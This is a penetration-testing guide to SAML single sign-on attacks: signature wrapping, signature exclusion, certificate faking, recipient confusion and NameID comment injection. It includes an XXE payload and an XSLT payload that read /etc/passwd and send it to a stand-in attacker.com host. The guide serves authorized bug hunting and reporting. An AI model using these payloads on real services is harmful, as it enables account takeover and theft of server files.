# SAML Attacks

Security Assertion Markup Language (SAML) is an XML-based protocol for implementing Single Sign-On (SSO): one set of credentials unlocks many applications. SAML messages are only Base64-encoded (trivially decoded), and parsing/verification pitfalls are rife — signature wrapping, excluded signatures, untrusted certificates and recipient confusion all let an attacker assert an identity they do not own. Real-world impact: authentication bypass and account takeover of any user (including admins) on the Service Provider.

Note: SAML and OAuth are different protocols for different purposes — OAuth is for **authorization**, SAML is for **authentication**.

## Roles (how it works)

```text
1. SAML Assertion: an XML message containing information about the user's identity
   and potentially other user attributes.
2. Identity Provider (IdP): performs the authentication (username/password, 2FA, ...)
   and issues the Assertion.
3. Service Provider (SP): the web application the user wants to access.
```

![SAML flow](https://user-images.githubusercontent.com/33719912/157280386-aecedbe9-55d9-49fb-aa20-afc31393c5f9.jpg)

## Hunting Checklist

1. **Find SAML endpoints** — Google dorks and Burp search (see below); trigger "Login with SSO/SAML".
2. Log in with a real account and **capture the SAMLResponse** (POST body, `PHNhbWx...`/`PD94bWw...` Base64 prefix) in SAML Raider.
3. **Decode it** (Base64 → XML) and map the elements: `Response`, `Assertion`, `Subject/NameID`, `Conditions/Recipient`, `Audience`, `SubjectConfirmationData`, `ds:Signature`.
4. Ask the client contact for a **second valid username** on the system (no credentials needed) — you need a target identity to assert.
5. Test **signature exclusion**: remove the `<ds:Signature>` and forward; if there is no error, tamper the `NameID`/UserID.
6. Test **XSW (signature wrapping)**: apply every one of the 8 XSW variants in SAML Raider, swapping the top/processed assertion to the victim.
7. Test **certificate faking**: self-sign the message with an attacker cert and re-sign.
8. Test **token recipient confusion**: try a valid token from a sibling SP on the same IdP.
9. Test **attribute/comment injection** in NameID during registration.
10. Test **XXE** and **XSLT** injection in the XML — both can outrun signature verification.
11. Confirm impact by landing in the victim's session.

## Test Cases & Examples

### Burp/Google hunting

```text
Google dorks to find SAML logins:
inurl:"/saml2?SAMLRequest="
inurl:"/simplesaml/module.php/core/loginuserpass.php?AuthState="
inurl:"simplesaml/saml2/idp"

Burp search [SAMLResponse]:
  1. PHNhbWx -> base64 decode -> '<saml'
  2. PD94bWw -> base64 decode -> '<?xml'
```

### 1. XML Signature Wrapping (XSW)

The premise: an XML document with an XML Signature is often processed in **two separate steps** — signature validation and then the real application consuming the data:

```text
- Signature validation:
  the app finds the <ds:Reference> element of the <ds:Signature>,
  uses its URI attribute to locate the signed element,
  and (in)validates that element.
- Data usage:
  the app's XML parser then locates its desired element via
  top-down tree-based navigation — which may NOT be the validated one.
```

XSW bypasses signature validation because the SP **does not check for multiple assertions**: send a valid signed assertion *plus* an invalid/unsigned one that impersonates another user (e.g. Admin); after the IdP authenticates *our* user, the confusion grants access to the other account. There are 8 XSW types, all easily applied with SAML Raider.

Steps:
1. Log in to the SSO.
2. Intercept the request where SAML assertions are visible in SAML Raider.
3. Try every XSW attack via the **"Apply XSW"** button.
4. Once applied, change the **top assertion** value to your desired account.
5. Forward, and check whether you land in the victim's session.

Variants (reference: [video](https://www.youtube.com/watch?v=ALakvKDsZLo)):

- **XSW #1 / #2 — the two that manipulate *Responses*.** #1 clones the Response+Assertion and inserts the original Signature as a child of the *copied* Response — the parser then picks the copy at the top instead of the signed original (enveloping signature). #2 is the same but with a **detached** signature; the malicious Response's position stays unchanged.
- **XSW #3 / #4 — Assertion elements.** #3: cloned Assertion inserted as first child of the root Response, sibling of the original. #4: like #3, but the original Assertion becomes a *child* of the duplicated Assertion.
- **XSW #5 / #6 — Assertion wrapping.** #5: the duplicated Assertion encircles the Signature (neither enveloped/enveloping/detached configuration). #6: copy sits where #4/#5 put theirs and envelopes the Signature, which in turn envelopes the original Assertion.
- **XSW #7 / #8 — Extensions (schema) abuse.** Extensions is a valid element with a broader schema. OpenSAML compared the ID used during validation to the processed Assertion's ID via schema validation — but copied Assertions with the *same ID* placed under a less-restrictive element evade that check. #7 inserts an Extensions element with the copied Assertion as child; #8 is the variant where the **original** Assertion is the child of the less restrictive element.

### 2. XML Signature Exclusion

Tests how the implementation behaves when **no Signature element exists** — the validation step may get skipped entirely.

1. Intercept the SAML response.
2. In SAML Raider click **"Remove Signatures"**.
3. Forward. If the SP returns no error, tamper attributes like UserID/NameID.
4. Check whether you are in the victim's account.

Related signature attacks: predictable signature, use of encryption with a weak signature.

### 3. Certificate Faking

Tests whether the SP verifies that a **trusted IdP** signed the message.

1. Intercept the SAML response in SAML Raider.
2. If a Signature is included, use **"Send Certificate to SAML Raider Certs"**.
3. In the SAML Raider Certificates tab, highlight the imported cert and press **"Save and Self-Sign"**.
4. Back in the SAML Raider proxy tab: select the new self-signed cert from the **XML Signature dropdown**.
5. **"Remove Signatures"**, then **"(Re-)Sign Message"** or **"(Re-)Sign Assertion"**.
6. Forward. Successful auth ⇒ you can sign your own SAML messages, i.e. change any Assertion value (NameID, attributes) and have the SP accept it.

### 4. Token Recipient Confusion

Tests whether the SP validates the **Recipient** — an attribute of `SubjectConfirmationData` (child of `Subject`) giving the URL the Assertion must be delivered to. If the Recipient is a *different* SP than the one receiving it, the Assertion must not be accepted.

Pre-requisite: a legitimate account on some SP using the **same IdP** as the target.

1. Get a token from Legit-SP.
2. Submit the same token to Target-SP.
3. If accepted, you access Target-SP resources as that account.

```text
Exploit 1: SP_A (Developer dept) and SP_target (Sales dept) accept tokens from the same IdP.
The attacker (a developer-team worker) has a legit account on SP_A, so they request token
tA from the IdP for that service — then send tA to SP_target instead of SP_A. If accepted,
the attacker is logged into SP_target under the same account name and gets its resources.

Exploit 2: The attacker sets up their own SP (S_bad, e.g. a weather-forecast service) and
specifically federates it via SSO with the same IdP used by SP_target. They lure a victim
(a legit SP_target user) to register and authenticate at S_bad, which secretly stores all
tokens in a database. The attacker then replays the victim's t_bad on SP_target; success =
logged into SP_target as the victim.
```

### 5. Miscellaneous attacks

**Direct assertion tampering:**
1. Intercept the SAML Response in SAML Raider.
2. Change the User parameter/id to another user — e.g. `user@email.com` → `admin@email.com`.
3. Forward.

**Comment injection I** — find the SP's registration page and register with:

```text
admin<!--comment-->@email.com
```

The SP parses it as `admin@email.com` → you are the admin.

**Comment injection II** — same idea when the first form is rejected:

```text
"admin<!--comment-->@gmail.com"  ==> Invalid signature
"admin@gmail.com<!--comment-->.test" ==> valid signature
```

Register with the second form; the SP still sees `admin@gmail.com`.

### 6. XXE in SAML

All XXE techniques apply — not limited to this example. Add a DOCTYPE at the beginning of the intercepted SAML Response:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
```

Send and inspect the response, then escalate (file read → SSRF → external DTD).

### 7. XSLT injection in SAML

> Note: the attack does **not** require a valid signature — the XSLT transformation happens *before* the digital signature is processed for verification.

Place an XSLT stylesheet inside the assertion's Transforms:

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  ...
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
            <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
            <xsl:value-of select="unparsed-text($exploitUrl)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  ...
</ds:Signature>
```

Forward and watch the exfiltrated file arrive at attacker.com, then escalate.

## Bypass Techniques

- Signature validation skipped: **absence** of `<ds:Signature>` (exclusion) vs **ignored** signature (wrap the processed assertion around an unrelated signed node).
- Parser-vs-validator divergence is the core of all 8 XSW variants — try each element position (Response copy, Assertion sibling/child/parent, Extensions child).
- Trust bypass via self-signed certificate re-signing (certificate faking).
- Cross-service token acceptance when `Recipient`/`Audience` is not checked.
- Parser comment handling to split/normalize `NameID` (`admin<!--x-->@corp.com`).
- XML-layer attacks (XXE, XSLT) that execute before signature verification.

## Tools & Resources

- [SAML Raider (Burp extension)](https://github.com/CompassSecurity/SAMLRaider) — certs, XSW one-click, sign/remove
- [SAML Encoder (samltool.com)](https://www.samltool.com/encode.php) — Base64/deflate encode-decode
- [SAMLExtractor](https://github.com/fadyosman/SAMLExtractor) — find SAML consume URLs from a URL list
- [yogisec/VulnerableSAMLApp](https://github.com/yogisec/VulnerableSAMLApp) — practice lab
- [How to Hunt Bugs in SAML, a Methodology I–III (epi052)](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/) — [II](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) / [III](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
- [sso-attacks.org](https://sso-attacks.org/Main_Page) — catalogue of SAML/SSO attacks
- [Bypassing SAML 2.0 SSO (Aura InfoSec)](https://research.aurainfosec.io/bypassing-saml20-SSO/)
- [Verification of SAML Tokens — Traps and Pitfalls](https://web-in-security.blogspot.com/2014/10/verification-of-saml-tokens-traps-and.html)
- [SAML From A Hacker's Perspective (video)](https://www.youtube.com/watch?v=KEwki41ZWmg&list=PLCwnLq3tOElrEU-KoOdeiixiNCWkeQ99F&index=1)
- Mindmaps: [Harsh Bothra SAML checklist (PDF)](https://drive.google.com/file/d/1iLgbd9IbcYgu4n1yJAVUyYbWnzYXmbyp/view?usp=drivesdk)

![SAML mindmap](https://raw.githubusercontent.com/0xInfection/Stuff/master/mindmaps/mind-map-saml.png)

## Report Tips

- "Any XML assertion can be forged → login as ANY user (incl. admins) without credentials" = auth bypass / full account takeover; usually critical on SSO perimeters.
- For recipient confusion, show the sibling-SP token accepted by the target — proof the tenant isolation assumption is broken.
- For XXE/XSLT, pair the identity angle with the file-read/SSF evidence (e.g. `/etc/passwd` exfiltration) for maximum triage clarity.

**Author:** [Kathan Patel](https://twitter.com/KathanP19)
